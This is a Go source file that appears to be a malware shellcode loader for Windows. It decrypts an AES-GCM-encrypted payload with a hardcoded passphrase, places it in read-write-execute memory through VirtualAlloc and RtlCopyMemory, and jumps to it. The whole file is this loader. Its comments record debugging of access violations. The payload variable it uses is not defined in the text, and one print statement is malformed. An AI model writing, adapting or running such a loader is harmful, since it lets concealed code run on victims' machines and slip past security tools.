
package main
import (
	"unsafe"
	"syscall"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
)

const (
    MEM_COMMIT             = 0x1000
    MEM_RESERVE            = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    ntdll         = syscall.MustLoadDLL("ntdll.dll")

    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "asdpasjdposad")
	/*Shellcode is correctly decrypted*/
	// Note: After the decryption process, we need to just add it as a string here, and have this function typecast it into bytes.
	//var shellcode = []byte(decryptedDat)
	var shellcode = decryptedDat
/*
Now we are hitting access violations. exit status 0xc0000005, check for DEP in WinDBG
*/
	addr, _, err := VirtualAlloc.Call(
	0, 
	uintptr(len(shellcode)), 
	MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	
	_, _, err = RtlCopyMemory.Call(
		addr, 
		(uintptr)(unsafe.Pointer(&shellcode[0])), 
		uintptr(len(shellcode)))
	
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	
	// jump to shellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}